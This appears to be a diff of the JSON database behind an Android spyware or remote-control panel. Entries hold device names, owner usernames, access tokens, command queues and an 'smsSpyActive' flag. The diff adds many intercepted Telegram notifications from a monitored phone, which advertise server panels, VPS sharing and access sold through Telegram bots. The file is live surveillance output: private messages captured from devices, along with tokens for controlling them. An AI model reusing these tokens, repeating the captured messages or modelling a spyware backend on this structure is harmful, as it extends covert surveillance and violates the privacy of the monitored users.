@@ -4,7 +4,7 @@
     "deviceName": "HP-TES123-74EC",
     "ownerUsername": "BLAY VIP",
     "token": "55a5b4006ca55171a079b79bc615ba6c",
-    "lastSeen": 1775458823247,
+    "lastSeen": 1775458826257,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-06T06:50:16.345Z",
@@ -2507,7 +2507,7 @@
     "deviceName": "HP-RISKI_123-D73B",
     "ownerUsername": "Riski",
     "token": "edadccccbb547c8d8cc05f1fd51950e5",
-    "lastSeen": 1775458820817,
+    "lastSeen": 1775458824364,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-06T06:52:49.760Z",
@@ -2529,6 +2529,102 @@
     },
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "こんにちは: DraxoClipsTamvan",
+        "content": "✅ Panel Berhasil Dibuat!\n\nUsername: Jil\nSpek: Unli RAM, Unli DISK, Unli CPU\nServer ID: 4\n\nDetail dikirim ke Telegram 8566868455",
+        "time": "06/04 14:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458826567
+      },
+      {
+        "appName": "Telegram",
+        "sender": "⏤͟͟͞͞l⚡ MURBUGVIP: autocpu",
+        "content": "📊 Monitoring CPU Server\n\nStatus Server:\n✅ Semua server normal (CPU < 80%)",
+        "time": "06/04 14:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458826545
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗠𝗨𝗥𝗕𝗨𝗚 𝗖𝗢𝗡𝗚: 𝐑𝐮𝐥𝐥𝐳 𝐊𝐚𝐧𝐢𝐳𝐚",
+        "content": "Sell Akses Fix Merah\n5k Permanent 1- slot minat pv @RullzKanizaShoppBot\nBOT FIX MERAH FREE\n@FixRedTeamKanizaBot\n@FixRedTeamKanizaBot",
+        "time": "06/04 14:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458826509
+      },
+      {
+        "appName": "Telegram",
+        "sender": "⩇⩇:⩇⩇",
+        "content": "PROMO PT 35 -3 SATSET BURUAN PV AJA @angkasanyabobo",
+        "time": "06/04 14:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458825742
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL TITLE VPS ( PRIVATE ): 𝙋𝙀𝙍𝙕𝙓𝙇𝙔 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇",
+        "content": "bagi vps 1 Wak pen buat SC 🗿",
+        "time": "06/04 14:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458825717
+      },
+      {
+        "appName": "Telegram",
+        "sender": "㉿ᖮ 𝒐𝒎 𝒂𝒏𝒈𝒌𝒂𝒔𝒂 - 𝑴𝑫 𝐓𝟓",
+        "content": "PROMO PT 35 -3 SATSET BURUAN PV AJA @angkasanyabobo",
+        "time": "06/04 14:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458825301
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "XTERCLOSE・8966 pesan baru dari 92 obrolan",
+        "time": "06/04 14:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458825178
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL BENEFIT PT YOTOSHI: King Dontol",
+        "content": "https://t.me/+M5FJeJIuccRkYmQ1",
+        "time": "06/04 14:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458824614
+      },
+      {
+        "appName": "Telegram",
+        "sender": "こんにちは: DraxoClipsTamvan",
+        "content": "✅ Panel Berhasil Dibuat!\n\nUsername: Jil\nSpek: Unli RAM, Unli DISK, Unli CPU\nServer ID: 4\n\nDetail dikirim ke Telegram 8566868455",
+        "time": "06/04 14:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458824554
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗠𝗨𝗥𝗕𝗨𝗚 𝗖𝗢𝗡𝗚: 𝐑𝐮𝐥𝐥𝐳 𝐊𝐚𝐧𝐢𝐳𝐚",
+        "content": "Sell Akses Fix Merah\n5k Permanent 1- slot minat pv @RullzKanizaShoppBot\nBOT FIX MERAH FREE\n@FixRedTeamKanizaBot\n@FixRedTeamKanizaBot",
+        "time": "06/04 14:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458824304
+      },
+      {
+        "appName": "Telegram",
+        "sender": "⏤͟͟͞͞l⚡ MURBUGVIP: autocpu",
+        "content": "📊 Monitoring CPU Server\n\nStatus Server:\n✅ Semua server normal (CPU < 80%)",
+        "time": "06/04 14:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458824044
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL TITLE VPS ( PRIVATE ): 𝙋𝙀𝙍𝙕𝙓𝙇𝙔 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇",
+        "content": "bagi vps 1 Wak pen buat SC 🗿",
+        "time": "06/04 14:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458823841
+      },
       {
         "appName": "Telegram",
         "sender": "⩇⩇:⩇⩇",
